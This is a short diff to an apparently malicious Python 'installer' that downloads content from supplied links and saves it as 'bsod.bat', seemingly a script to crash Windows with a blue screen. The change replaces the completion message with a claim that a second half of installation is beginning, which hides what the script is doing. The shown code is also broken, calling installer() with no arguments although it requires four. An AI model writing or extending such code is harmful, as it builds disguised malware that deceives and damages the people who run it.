@@ -51,7 +51,9 @@ def installer(link1, link2, link3, link4):
     with open("bsod.bat", "wb")as file:
         file.write(response.content)
 
-    print("Installation complete.")
+    print("""Part 1 of installation complete.
+Now beginning 2nd half of installation...""")
+    time.sleep(1)
         
 if __name__ == "__main__":
     installer()
